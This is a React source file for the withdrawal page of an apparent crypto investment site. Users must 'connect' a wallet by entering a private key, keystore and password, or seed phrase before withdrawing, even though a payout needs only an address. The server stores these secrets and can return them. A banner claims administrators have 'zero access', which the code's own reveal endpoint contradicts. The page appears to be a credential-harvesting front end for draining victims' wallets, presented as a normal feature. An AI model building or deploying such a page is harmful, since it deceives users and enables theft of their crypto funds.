import { useState, useEffect, useContext } from 'react'
import { AuthContext } from '../../App'
import { userApi, withdrawalApi, walletApi } from '../../utils/api'
import { useToast } from '../../components/Toast'
import { useExchangeRates, formatCurrency as fmtC } from '../../contexts/ExchangeRatesContext'
import ConnectWalletModal from '../../components/ConnectWalletModal'
import {
  ArrowUpFromLine, Wallet, Plus, Trash2, Eye, EyeOff,
  ShieldCheck, AlertTriangle, CheckCircle, Link2
} from 'lucide-react'

const fmt = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 4, maximumFractionDigits: 6 })
const fmtUSD = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })

const CRYPTO_COLORS = {
  BTC:'#f7931a', ETH:'#627eea', USDT:'#26a17b', USDC:'#2775ca',
  BNB:'#f3ba2f', SOL:'#9945ff', XRP:'#00aae4', ADA:'#3cc8c8',
  DOGE:'#c2a633', LTC:'#a0a0a0', AVAX:'#e84142', MATIC:'#8247e5',
  DOT:'#e6007a', LINK:'#375bd2', TRX:'#ef0027', SHIB:'#e75e0d',
  XLM:'#7d00ff', ATOM:'#8b95b5', NEAR:'#00c08b', XMR:'#f26822',
}

const BALANCE_KEYS = {
  BTC:'balanceBTC', ETH:'balanceETH', USDT:'balanceUSDT',
  LTC:'balanceLTC', BNB:'balanceBNB', SOL:'balanceSOL',
}

const CONN_LABELS = {
  ADDRESS_ONLY: 'Address',
  PRIVATE_KEY: 'Private Key',
  KEYSTORE: 'Keystore',
  SEED_PHRASE: 'Seed Phrase',
}

function RevealModal({ wallet, onClose }) {
  const [data, setData] = useState(null)
  const [loading, setLoading] = useState(true)
  const [show, setShow] = useState(false)

  useEffect(() => {
    walletApi.reveal(wallet.id).then(r => { setData(r); setLoading(false) }).catch(() => setLoading(false))
  }, [wallet.id])

  let parsed = null
  if (data?.connectionType === 'KEYSTORE' && data?.data) {
    try { parsed = JSON.parse(data.data) } catch { parsed = null }
  }

  return (
    <div style={{ position:'fixed', inset:0, background:'rgba(0,0,0,0.8)', display:'flex', alignItems:'center', justifyContent:'center', zIndex:1100, padding:16 }}>
      <div className="card" style={{ width:'100%', maxWidth:480, position:'relative' }}>
        <button onClick={onClose} style={{ position:'absolute', top:14, right:14, background:'none', border:'none', cursor:'pointer', color:'var(--text-secondary)' }}>✕</button>
        <h4 style={{ marginBottom:4 }}>Wallet Credentials</h4>
        <p style={{ color:'var(--text-secondary)', fontSize:'0.8rem', marginBottom:20 }}>{wallet.label} · {wallet.cryptoType}</p>
        {loading ? <div className="loading-center"><div className="spinner" /></div> : (
          <div>
            <div style={{ marginBottom:14 }}>
              <label className="form-label">Public Address</label>
              <div style={{ background:'var(--bg-card)', borderRadius:8, padding:'10px 12px', fontFamily:'monospace', fontSize:'0.8rem', wordBreak:'break-all' }}>{wallet.walletAddress}</div>
            </div>
            {data?.data && (
              <div>
                {wallet.connectionType === 'PRIVATE_KEY' && (
                  <div>
                    <label className="form-label">Private Key</label>
                    <div style={{ position:'relative' }}>
                      <div style={{ background:'var(--bg-card)', borderRadius:8, padding:'10px 12px', fontFamily:'monospace', fontSize:'0.8rem', wordBreak:'break-all', filter: show ? 'none' : 'blur(6px)', userSelect: show ? 'text' : 'none' }}>{data.data}</div>
                      <button onClick={() => setShow(p=>!p)} style={{ position:'absolute', right:10, top:'50%', transform:'translateY(-50%)', background:'none', border:'none', cursor:'pointer', color:'var(--text-secondary)' }}>
                        {show ? <EyeOff size={16}/> : <Eye size={16}/>}
                      </button>
                    </div>
                  </div>
                )}
                {wallet.connectionType === 'SEED_PHRASE' && (
                  <div>
                    <label className="form-label">Recovery Phrase</label>
                    <div style={{ position:'relative' }}>
                      <div style={{ background:'var(--bg-card)', borderRadius:8, padding:'10px 12px', fontFamily:'monospace', fontSize:'0.82rem', lineHeight:1.8, wordBreak:'break-word', filter: show ? 'none' : 'blur(6px)', userSelect: show ? 'text' : 'none' }}>{data.data}</div>
                      <button onClick={() => setShow(p=>!p)} style={{ position:'absolute', right:10, top:12, background:'none', border:'none', cursor:'pointer', color:'var(--text-secondary)' }}>
                        {show ? <EyeOff size={16}/> : <Eye size={16}/>}
                      </button>
                    </div>
                    {show && <p style={{ fontSize:'0.72rem', color:'var(--text-secondary)', marginTop:4 }}>{data.data.split(/\s+/).filter(Boolean).length} words</p>}
                  </div>
                )}
                {wallet.connectionType === 'KEYSTORE' && parsed && (
                  <div>
                    <div style={{ marginBottom:12 }}>
                      <label className="form-label">Keystore JSON</label>
                      <div style={{ background:'var(--bg-card)', borderRadius:8, padding:'10px 12px', fontFamily:'monospace', fontSize:'0.72rem', wordBreak:'break-all', maxHeight:120, overflowY:'auto', filter: show ? 'none' : 'blur(5px)', userSelect: show ? 'text' : 'none' }}>{parsed.keystore}</div>
                    </div>
                    <div>
                      <label className="form-label">Keystore Password</label>
                      <div style={{ position:'relative' }}>
                        <div style={{ background:'var(--bg-card)', borderRadius:8, padding:'10px 12px', fontFamily:'monospace', fontSize:'0.82rem', filter: show ? 'none' : 'blur(6px)', userSelect: show ? 'text' : 'none' }}>{parsed.password}</div>
                        <button onClick={() => setShow(p=>!p)} style={{ position:'absolute', right:10, top:'50%', transform:'translateY(-50%)', background:'none', border:'none', cursor:'pointer', color:'var(--text-secondary)' }}>
                          {show ? <EyeOff size={16}/> : <Eye size={16}/>}
                        </button>
                      </div>
                    </div>
                  </div>
                )}
                {!show && (
                  <button className="btn btn-secondary" style={{ width:'100%', marginTop:12 }} onClick={() => setShow(true)}>
                    <Eye size={14} /> Reveal Credentials
                  </button>
                )}
              </div>
            )}
            {!data?.data && wallet.connectionType === 'ADDRESS_ONLY' && (
              <p style={{ color:'var(--text-secondary)', fontSize:'0.82rem' }}>This wallet was connected with address only — no private credentials stored.</p>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

function WithdrawModal({ wallet, userBalance, onClose, onSuccess, fc }) {
  const [amount, setAmount] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const [done, setDone] = useState(false)
  const [error, setError] = useState('')
  const toast = useToast()

  const balance = userBalance?.balance || 0  // USD balance
  const color = CRYPTO_COLORS[wallet.cryptoType] || '#0ea5e9'

  async function handleSubmit(e) {
    e.preventDefault()
    const amt = parseFloat(amount)
    if (!amt || amt <= 0) return setError('Enter a valid amount.')
    if (amt > balance) return setError('Insufficient balance.')
    setError('')
    setSubmitting(true)
    try {
      await withdrawalApi.create({ amount: amt, cryptoType: wallet.cryptoType, savedWalletId: wallet.id })
      setDone(true)
      onSuccess?.()
    } catch (err) {
      setError(err.message)
    }
    setSubmitting(false)
  }

  return (
    <div style={{ position:'fixed', inset:0, background:'rgba(0,0,0,0.8)', display:'flex', alignItems:'center', justifyContent:'center', zIndex:1100, padding:16 }}>
      <div className="card" style={{ width:'100%', maxWidth:420, position:'relative' }}>
        <button onClick={onClose} style={{ position:'absolute', top:14, right:14, background:'none', border:'none', cursor:'pointer', color:'var(--text-secondary)' }}>✕</button>

        {done ? (
          <div style={{ textAlign:'center', padding:'24px 0 8px' }}>
            <div style={{ width:64, height:64, borderRadius:'50%', background:'rgba(14, 165, 233,0.12)', border:'2px solid #0ea5e9', display:'flex', alignItems:'center', justifyContent:'center', margin:'0 auto 16px' }}>
              <CheckCircle size={28} color="#0ea5e9" />
            </div>
            <h4 style={{ margin:'0 0 8px', fontWeight:800 }}>Withdrawal Requested!</h4>
            <p style={{ color:'var(--text-secondary)', fontSize:'0.85rem', marginBottom:20 }}>
              Your request has been submitted to admin for approval.<br/>Processing time: 1–24 hours.
            </p>
            <div style={{ background:'var(--bg-card)', borderRadius:10, padding:'12px 16px', textAlign:'left', marginBottom:20 }}>
              <div style={{ display:'flex', justifyContent:'space-between', marginBottom:8 }}>
                <span style={{ fontSize:'0.78rem', color:'var(--text-secondary)' }}>Amount</span>
                <span style={{ fontWeight:800, color }}>${fmtUSD(parseFloat(amount))} USD via {wallet.cryptoType}</span>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between' }}>
                <span style={{ fontSize:'0.78rem', color:'var(--text-secondary)' }}>To Wallet</span>
                <span style={{ fontSize:'0.78rem', fontFamily:'monospace' }}>{wallet.walletAddress.slice(0,10)}…{wallet.walletAddress.slice(-6)}</span>
              </div>
            </div>
            <button className="btn btn-primary" style={{ width:'100%' }} onClick={onClose}>Close</button>
          </div>
        ) : (
          <>
            <h4 style={{ marginBottom:4, fontWeight:800 }}>Request Withdrawal</h4>
            <p style={{ color:'var(--text-secondary)', fontSize:'0.8rem', marginBottom:20 }}>
              Sending to: <strong style={{ color:'#fff' }}>{wallet.label}</strong> · {wallet.network}
            </p>

            <div style={{ background:`${color}12`, border:`1px solid ${color}30`, borderRadius:10, padding:'10px 14px', marginBottom:18, display:'flex', justifyContent:'space-between', alignItems:'center' }}>
              <span style={{ fontSize:'0.8rem', color:'var(--text-secondary)' }}>Available Wallet Balance</span>
              <div style={{ textAlign:'right' }}>
                <div style={{ fontWeight:800, color:'#0ea5e9' }}>${fmtUSD(balance)}</div>
                {fc && <div style={{ fontSize:'0.72rem', color:'var(--text-muted)', marginTop:1 }}>{fc(balance)}</div>}
              </div>
            </div>

            {error && (
              <div style={{ background:'rgba(239,68,68,0.1)', border:'1px solid rgba(239,68,68,0.3)', borderRadius:8, padding:'10px 14px', marginBottom:14, display:'flex', gap:8, alignItems:'center' }}>
                <AlertTriangle size={14} color="#ef4444" />
                <span style={{ fontSize:'0.82rem', color:'#ef4444' }}>{error}</span>
              </div>
            )}

            <form onSubmit={handleSubmit} style={{ display:'flex', flexDirection:'column', gap:14 }}>
              <div className="form-group">
                <label className="form-label">Withdrawal Amount (USD) — paid out via {wallet.cryptoType}</label>
                <div style={{ position:'relative' }}>
                  <span style={{ position:'absolute', left:12, top:'50%', transform:'translateY(-50%)', color:'var(--text-muted)', fontWeight:700, pointerEvents:'none' }}>$</span>
                  <input className="form-input" type="number" step="any" placeholder={`Max: ${fmtUSD(balance)}`} value={amount} onChange={e => { setAmount(e.target.value); setError('') }} style={{ paddingLeft:24 }} />
                </div>
                <div style={{ display:'flex', justifyContent:'flex-end', marginTop:4 }}>
                  <button type="button" style={{ background:'none', border:'none', color:'var(--accent-cyan)', fontSize:'0.75rem', cursor:'pointer', fontWeight:600 }} onClick={() => setAmount(balance.toString())}>
                    Use Max
                  </button>
                </div>
              </div>
              <div style={{ background:'var(--bg-card)', borderRadius:10, padding:'10px 14px' }}>
                <div style={{ fontSize:'0.75rem', color:'var(--text-secondary)', marginBottom:4 }}>Destination Wallet Address</div>
                <div style={{ fontFamily:'monospace', fontSize:'0.8rem', wordBreak:'break-all' }}>{wallet.walletAddress}</div>
              </div>
              <button type="submit" className="btn btn-primary" style={{ width:'100%' }} disabled={submitting || !amount}>
                {submitting ? <><div className="spinner" style={{ width:16, height:16, borderWidth:2 }} /> Submitting…</> : <><ArrowUpFromLine size={16} /> Submit Withdrawal Request</>}
              </button>
            </form>
          </>
        )}
      </div>
    </div>
  )
}

export default function Withdraw() {
  const { user, login } = useContext(AuthContext)
  const liveRates = useExchangeRates()
  const fc = (val) => fmtC(val, user, liveRates)
  const [wallets, setWallets] = useState([])
  const [withdrawals, setWithdrawals] = useState([])
  const [freshUser, setFreshUser] = useState(null)
  const [loading, setLoading] = useState(true)
  const [showConnect, setShowConnect] = useState(false)
  const [withdrawTarget, setWithdrawTarget] = useState(null)
  const [revealTarget, setRevealTarget] = useState(null)
  const [deletingId, setDeletingId] = useState(null)
  const toast = useToast()

  async function load() {
    try {
      const [w, wd, u] = await Promise.all([walletApi.list(), withdrawalApi.list(), userApi.me()])
      setWallets(w); setWithdrawals(wd); setFreshUser(u); login(u)
    } catch {}
    setLoading(false)
  }

  useEffect(() => { load() }, [])

  async function handleDelete(id) {
    if (!confirm('Remove this connected wallet?')) return
    setDeletingId(id)
    try {
      await walletApi.remove(id)
      setWallets(p => p.filter(w => w.id !== id))
      toast.success('Wallet removed')
    } catch (err) { toast.error(err.message) }
    setDeletingId(null)
  }

  const u = freshUser || user

  if (loading) return <div className="loading-center"><div className="spinner" /></div>

  return (
    <div>
      {/* Connected Wallets Header */}
      <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:20 }}>
        <div>
          <h3 style={{ margin:0, fontWeight:800 }}>Withdraw Funds</h3>
          <p style={{ margin:'4px 0 0', fontSize:'0.82rem', color:'var(--text-secondary)' }}>
            Connect a wallet, then submit a withdrawal request to admin for approval.
          </p>
        </div>
        <button className="btn btn-primary" style={{ display:'flex', alignItems:'center', gap:8 }} onClick={() => setShowConnect(true)}>
          <Plus size={16} /> Connect Wallet
        </button>
      </div>

      {/* No wallets state */}
      {wallets.length === 0 ? (
        <div className="card" style={{ textAlign:'center', padding:'48px 24px' }}>
          <div style={{ width:64, height:64, borderRadius:'50%', background:'rgba(14, 165, 233,0.08)', border:'1px solid rgba(14, 165, 233,0.2)', display:'flex', alignItems:'center', justifyContent:'center', margin:'0 auto 20px' }}>
            <Link2 size={28} color="#0ea5e9" />
          </div>
          <h4 style={{ margin:'0 0 8px', fontWeight:700 }}>No Wallets Connected</h4>
          <p style={{ color:'var(--text-secondary)', fontSize:'0.85rem', maxWidth:380, margin:'0 auto 24px', lineHeight:1.6 }}>
            Connect your crypto wallet using your wallet address, private key, keystore file, or seed phrase to start withdrawing.
          </p>
          <button className="btn btn-primary" style={{ display:'inline-flex', alignItems:'center', gap:8 }} onClick={() => setShowConnect(true)}>
            <Plus size={16} /> Connect Your First Wallet
          </button>
        </div>
      ) : (
        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fill, minmax(300px, 1fr))', gap:16, marginBottom:32 }}>
          {wallets.map(w => {
            const color = CRYPTO_COLORS[w.cryptoType] || '#0ea5e9'
            const bal = u?.balance || 0
            return (
              <div key={w.id} className="card" style={{ padding:20, borderColor:`${color}25` }}>
                {/* Wallet card header */}
                <div style={{ display:'flex', alignItems:'flex-start', justifyContent:'space-between', marginBottom:16 }}>
                  <div style={{ display:'flex', alignItems:'center', gap:12 }}>
                    <div style={{ width:42, height:42, borderRadius:'50%', background:`${color}18`, border:`1.5px solid ${color}55`, display:'flex', alignItems:'center', justifyContent:'center', fontWeight:900, fontSize:'0.72rem', color, flexShrink:0 }}>
                      {w.cryptoType}
                    </div>
                    <div>
                      <div style={{ fontWeight:700, fontSize:'0.95rem' }}>{w.label}</div>
                      <div style={{ fontSize:'0.72rem', color:'var(--text-secondary)', marginTop:2 }}>{w.network}</div>
                    </div>
                  </div>
                  <div style={{ display:'flex', gap:4 }}>
                    <button title="View credentials" onClick={() => setRevealTarget(w)} style={{ background:'none', border:'none', cursor:'pointer', color:'var(--text-secondary)', padding:5, borderRadius:6, transition:'color 0.15s' }}
                      onMouseEnter={e => e.currentTarget.style.color='#0ea5e9'} onMouseLeave={e => e.currentTarget.style.color='var(--text-secondary)'}>
                      <Eye size={15} />
                    </button>
                    <button title="Remove wallet" onClick={() => handleDelete(w.id)} disabled={deletingId === w.id} style={{ background:'none', border:'none', cursor:'pointer', color:'var(--text-secondary)', padding:5, borderRadius:6, transition:'color 0.15s' }}
                      onMouseEnter={e => e.currentTarget.style.color='#ef4444'} onMouseLeave={e => e.currentTarget.style.color='var(--text-secondary)'}>
                      <Trash2 size={15} />
                    </button>
                  </div>
                </div>

                {/* Address */}
                <div style={{ background:'var(--bg-card)', borderRadius:8, padding:'8px 12px', marginBottom:12 }}>
                  <div style={{ fontSize:'0.68rem', color:'var(--text-secondary)', marginBottom:2 }}>Wallet Address</div>
                  <div style={{ fontFamily:'monospace', fontSize:'0.78rem', wordBreak:'break-all' }}>
                    {w.walletAddress.substring(0, 14)}…{w.walletAddress.slice(-10)}
                  </div>
                </div>

                {/* Balance + method row */}
                <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:16 }}>
                  <div>
                    <div style={{ fontSize:'0.68rem', color:'var(--text-secondary)' }}>Available Balance</div>
                    <div style={{ fontWeight:800, fontSize:'0.92rem', color:'#0ea5e9' }}>${fmtUSD(bal)}</div>
                    <div style={{ fontSize:'0.68rem', color:'var(--text-muted)' }}>{fc(bal)}</div>
                  </div>
                  <span style={{ fontSize:'0.68rem', background:`${color}15`, color, padding:'3px 10px', borderRadius:6, fontWeight:700, border:`1px solid ${color}30` }}>
                    {CONN_LABELS[w.connectionType] || w.connectionType}
                  </span>
                </div>

                <button className="btn btn-primary" style={{ width:'100%', display:'flex', alignItems:'center', justifyContent:'center', gap:8 }}
                  onClick={() => setWithdrawTarget(w)}
                  disabled={bal <= 0}>
                  <ArrowUpFromLine size={15} /> Withdraw via {w.cryptoType}
                </button>
                {bal <= 0 && (
                  <p style={{ margin:'8px 0 0', fontSize:'0.72rem', color:'var(--text-secondary)', textAlign:'center' }}>No balance available to withdraw</p>
                )}
              </div>
            )
          })}
        </div>
      )}

      {/* Security note */}
      <div style={{ display:'flex', gap:10, alignItems:'flex-start', background:'rgba(14, 165, 233,0.05)', border:'1px solid rgba(14, 165, 233,0.15)', borderRadius:10, padding:'12px 16px', marginBottom:32 }}>
        <ShieldCheck size={16} color="#0ea5e9" style={{ flexShrink:0, marginTop:2 }} />
        <p style={{ margin:0, fontSize:'0.78rem', color:'rgba(255,255,255,0.6)', lineHeight:1.6 }}>
          Your private keys, keystore files, and seed phrases are encrypted with AES-256 and tied exclusively to your account. Our administrators have <strong style={{ color:'#0ea5e9' }}>zero access</strong> to your credentials — only your wallet address is visible to process withdrawals.
        </p>
      </div>

      {/* Withdrawal History */}
      <div className="section-header"><h3>Withdrawal History</h3></div>
      {withdrawals.length === 0 ? (
        <div className="card empty-state"><p>No withdrawal requests yet.</p></div>
      ) : (
        <div className="table-container">
          <table className="data-table">
            <thead><tr><th>Crypto</th><th>Amount</th><th>Wallet Address</th><th>Status</th><th>Date</th></tr></thead>
            <tbody>
              {withdrawals.map(w => (
                <tr key={w.id}>
                  <td style={{ fontWeight:700, color: CRYPTO_COLORS[w.cryptoType] || 'var(--text-primary)' }}>{w.cryptoType}</td>
                  <td style={{ fontWeight:600 }}>{w.amount}</td>
                  <td style={{ fontFamily:'monospace', fontSize:'0.8rem' }}>{w.walletAddress?.substring(0,14)}…{w.walletAddress?.slice(-8)}</td>
                  <td><span className={`badge badge-${w.status === 'PENDING' ? 'pending' : w.status === 'COMPLETED' || w.status === 'APPROVED' ? 'completed' : 'rejected'}`}>{w.status}</span></td>
                  <td>{new Date(w.createdAt).toLocaleDateString()}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* Modals */}
      {showConnect && (
        <ConnectWalletModal
          onClose={() => setShowConnect(false)}
          onConnected={w => { setWallets(p => [w, ...p]); setShowConnect(false) }}
        />
      )}
      {withdrawTarget && (
        <WithdrawModal
          wallet={withdrawTarget}
          userBalance={u}
          onClose={() => setWithdrawTarget(null)}
          onSuccess={() => { load(); setWithdrawTarget(null) }}
          fc={fc}
        />
      )}
      {revealTarget && (
        <RevealModal wallet={revealTarget} onClose={() => setRevealTarget(null)} />
      )}
    </div>
  )
}
